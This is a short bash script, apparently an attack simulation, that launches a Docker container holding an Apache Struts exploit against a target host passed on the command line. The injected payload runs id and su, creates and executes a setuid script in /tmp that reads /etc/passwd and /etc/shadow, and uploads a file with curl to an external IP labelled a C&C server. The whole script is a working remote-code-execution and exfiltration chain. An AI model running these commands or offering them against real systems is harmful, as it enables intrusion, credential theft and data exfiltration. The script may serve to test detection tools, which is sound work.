#!/bin/bash
curl $1:8080
echo "Running Exploit Container"
docker rm -f cve-5638-exploit
docker run --name=cve-5638-exploit --net=host deepfenceio/deepfence_apache_struts_exploit http://$1:8080/hello "echo \"\nChecking user id\n-------------------------------------\n\";id;echo \"\nChecking files as Super user\n-------------------------------------\n\";su -c /bin/ls root;echo \"\nCreating new payload pwd.bin\n-------------------------------------\n\";touch /tmp/pwnd.bin; echo \"\nstrace ls -l; sleep 20& kill -11 %1;cat /etc/passwd /etc/shadow \n\">/tmp/pwnd.bin;cat /tmp/pwnd.bin; chmod +x /tmp/pwnd.bin; chmod u+s /tmp/pwnd.bin; /tmp/pwnd.bin; sleep 5; echo \"\nUploading sensitive data to remote C&C server\n-------------------------------------\";curl --upload-file /bin/ls --url http://149.202.52.215/"
